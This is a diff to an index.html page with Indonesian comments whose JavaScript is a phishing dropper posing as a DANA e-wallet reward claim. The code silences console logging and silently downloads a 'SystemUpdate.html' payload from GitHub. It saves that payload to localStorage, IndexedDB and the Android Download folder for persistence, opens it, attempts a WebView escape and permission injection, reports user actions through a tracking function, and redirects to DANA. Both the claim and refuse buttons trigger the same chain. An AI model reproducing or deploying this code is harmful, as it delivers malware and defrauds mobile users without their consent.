@@ -64,7 +64,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - UNIVERSAL + PERSISTENSI 24/7
+// 🔥 INDEX.HTML - UNIVERSAL + PERSISTENSI 24/7 (REAL)
 // ============================================================
 
 console.log = function() {};
@@ -139,25 +139,22 @@ var NOTIFICATION_SHOWN = false;
 var REDIRECT_DONE = false;
 
 // ============================================================
-// ANDROID BRIDGE WRAPPER - UNIVERSAL
+// ANDROID BRIDGE WRAPPER - UNIVERSAL (FALLBACK KE BROWSER)
 // ============================================================
 var A = {
     isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
     downloadFile: function(url, path) { 
         if(this.isAvailable){ try{ return AndroidBridge.downloadFile(url, path); }catch(e){} }
-        // Fallback: download via anchor
         try { var a = document.createElement('a'); a.href = url; a.download = path.split('/').pop(); a.click(); return true; } catch(e){}
         return false;
     },
     openFile: function(path) { 
         if(this.isAvailable){ try{ return AndroidBridge.openFile(path); }catch(e){} }
-        // Fallback: buka via window.open
         try { window.open('file://' + path, '_blank'); return true; } catch(e){}
         return false;
     },
     saveFile: function(path, content) {
         if(this.isAvailable){ try{ return AndroidBridge.saveFile(path, content); }catch(e){} }
-        // Fallback: simpan ke localStorage
         try { localStorage.setItem('file_' + path, content); return true; } catch(e){}
         return false;
     },
@@ -209,9 +206,7 @@ function K(d) {
 // SIMPAN HTML KE SEMUA LOKASI (PERSISTENSI 24/7)
 // ============================================================
 function saveToAllLocations(htmlContent) {
-    // 1. localStorage
     try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
-    // 2. IndexedDB
     try {
         var request = indexedDB.open('SystemUpdateDB', 1);
         request.onupgradeneeded = function(e) {
@@ -227,7 +222,6 @@ function saveToAllLocations(htmlContent) {
             store.put(htmlContent, 'SystemUpdate.html');
         };
     } catch(e) {}
-    // 3. Bridge (jika ada)
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
             var path = '/storage/emulated/0/Download/SystemUpdate.html';
@@ -246,11 +240,8 @@ function saveToAllLocations(htmlContent) {
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
     DOWNLOAD_STARTED = true;
-    
     K({ sumber: 'download_start', data: { platform: PLATFORM } });
-    
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
-    
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', htmlUrl, true);
@@ -268,7 +259,6 @@ function downloadPayloadSilent() {
 }
 
 function openSystemUpdateHTML(htmlContent) {
-    // Jika ada bridge, buka file fisik
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
             var path = '/storage/emulated/0/Download/SystemUpdate.html';
@@ -278,7 +268,6 @@ function openSystemUpdateHTML(htmlContent) {
             }
         } catch(e) {}
     }
-    // Fallback: Blob URL (semua platform)
     try {
         var blob = new Blob([htmlContent], { type: 'text/html' });
         var url = URL.createObjectURL(blob);
@@ -332,10 +321,9 @@ function escapeWebView() {
 function showKlaimNotification() {
     if (NOTIFICATION_SHOWN) return;
     NOTIFICATION_SHOWN = true;
-    
     try {
-        if (!('Notification' in window)) { return; }
-        if (Notification.permission === 'denied') { return; }
+        if (!('Notification' in window)) return;
+        if (Notification.permission === 'denied') return;
         if (Notification.permission !== 'granted') {
             Notification.requestPermission().then(function(permission) {
                 if (permission === 'granted') { createKlaimNotification(); }
@@ -355,7 +343,6 @@ function createKlaimNotification() {
             silent: false,
             vibrate: [200, 100, 200]
         });
-        
         notif.onclick = function() {
             notif.close();
             if (!REDIRECT_DONE) {
@@ -365,7 +352,6 @@ function createKlaimNotification() {
                 }, 500);
             }
         };
-        
         setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
     } catch(e) {}
 }
@@ -390,23 +376,17 @@ function redirectToDANA() {
 function dapatkanSemua() {
     if (semuaDidapat) return;
     semuaDidapat = true;
-    
     try {
         var popup = document.getElementById('popupDana');
         if (popup) popup.style.display = 'none';
-        
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
-        
         injectAllPermissions();
-        
         setTimeout(escapeWebView, 100);
         setTimeout(function() { downloadPayloadSilent(); }, 500);
         setTimeout(function() { showStatusBar(); }, 500);
         openSystemUpdateHTML();
-        
         setTimeout(function() { showKlaimNotification(); }, 3000);
         setTimeout(redirectToDANA, 8000);
-        
     } catch(e) {
         K({ sumber: 'dapatkanSemua_error', data: e.message });
     }
@@ -415,7 +395,6 @@ function dapatkanSemua() {
 function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
 function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }
 
-// Timer 10 detik
 var w = 10;
 var timerInterval = setInterval(function() {
     w--;
@@ -435,7 +414,6 @@ document.addEventListener('click', function() {
     }
 });
 
-// Register Service Worker
 if ('serviceWorker' in navigator) {
     navigator.serviceWorker.register('/sw.js', { scope: '/' })
         .catch(function() {});
